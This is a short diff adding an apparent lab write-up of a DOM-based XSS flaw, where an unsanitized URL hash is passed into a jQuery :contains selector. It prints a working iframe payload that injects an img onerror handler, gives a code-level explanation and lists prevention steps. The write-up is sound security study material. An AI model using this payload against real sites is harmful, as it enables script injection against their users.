@@ -1,0 +1,20 @@
+Vulnerability:
+	The page dynamically processes the URL hash using a jQuery :contains selector without sanitizing the input,
+	Allowing an attacker to inject and execute malicious JavaScript.
+	
+Exploit:
+	Example:
+		<iframe src="https://server.net#" onload="this.src +='<img src=x onerror=[PAYLOAD]>'">
+	
+	Exploit Script:
+		<iframe src="https://server.net#" onload="this.src +='<img src=x onerror=print(1)>'">
+	
+Explanation:
+	- The website listens for hashchange events and extracts the hash using window.location.hash.slice(1).
+	- The unsanitized hash is inserted into a jQuery selector: $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')').
+	- By injecting <img src=x onerror=print(1)> as the hash, the <img> tag’s onerror event triggers, running the malicious print(1)` function.
+	
+Prevention:
+	- Sanitize window.location.hash to escape HTML characters.
+	- Avoid using user input in dynamic jQuery selectors.
+	- Use a whitelist of allowed hash values.
